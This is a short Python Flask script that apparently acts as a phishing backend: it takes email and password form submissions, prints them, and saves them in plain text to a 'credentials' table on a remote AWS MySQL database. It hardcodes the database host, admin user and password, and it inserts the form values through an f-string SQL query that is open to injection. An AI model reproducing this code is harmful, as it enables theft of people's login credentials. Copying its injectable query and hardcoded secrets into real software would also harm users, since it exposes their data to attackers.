from flask import Flask, render_template, request
import pymysql

SAVING = True
HOST = "mydb1.c4ls5d2x2zq9.eu-west-2.rds.amazonaws.com"
USERNAME = "admin"
PASSWORD = "G00dy4paw3%"

connection = pymysql.connect(host=HOST, user=USERNAME, password=PASSWORD)
c = connection.cursor()

c.execute("USE mydb1")
c.execute("CREATE TABLE IF NOT EXISTS credentials (email TEXT, password TEXT)")

app = Flask(__name__)

@app.route("/", methods=["GET", "POST"])
def home():
    if request.method == "POST":
        Email, Password = request.form.get("email"), request.form.get("password")
        print(Email); print(Password)
        if Email != None and Password != None:
            c.execute(f"INSERT INTO credentials VALUES ('{Email}', '{Password}')")
            c.execute("SELECT * FROM credentials")
            print(c.fetchall())
            connection.commit()
    return render_template("index.html")

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)

if SAVING:
    connection.commit()

c.close()
connection.close()
